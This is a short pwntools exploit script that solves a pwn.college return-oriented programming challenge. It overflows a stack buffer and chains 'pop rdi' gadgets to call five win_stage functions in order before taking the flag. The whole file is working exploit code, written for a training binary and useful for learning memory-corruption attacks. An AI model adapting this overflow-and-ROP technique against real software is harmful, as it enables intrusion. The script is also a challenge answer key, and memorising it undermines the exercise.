#!/usr/bin/env python3
# pwn.college/program-security/return-oriented-programming/
# Challenge: chain-of-command-hard

from pwn import *

# Target information
# All win_stage functions found via objdump
win_stage_1 = 0x4015E3
win_stage_2 = 0x40133A
win_stage_3 = 0x4016BF
win_stage_4 = 0x40141A
win_stage_5 = 0x401500

# ROP gadget: pop rdi ; ret
pop_rdi = 0x401903

# Offset calculation:
# Buffer at -0x50(%rbp)
# Saved RBP is 8 bytes
# Return address is after saved RBP
offset = 0x50 + 0x8

# Build ROP chain
# Each stage needs: pop_rdi (to set arg1) + stage_number + win_stage_N address
payload = b"A" * offset

# Stage 1: win_stage_1(1)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(win_stage_1)

# Stage 2: win_stage_2(2)
payload += p64(pop_rdi)
payload += p64(2)
payload += p64(win_stage_2)

# Stage 3: win_stage_3(3)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(win_stage_3)

# Stage 4: win_stage_4(4)
payload += p64(pop_rdi)
payload += p64(4)
payload += p64(win_stage_4)

# Stage 5: win_stage_5(5)
payload += p64(pop_rdi)
payload += p64(5)
payload += p64(win_stage_5)

# Start the challenge process
io = process("/challenge/chain-of-command-hard")

# Send the payload
io.send(payload)

# Get the flag
io.interactive()
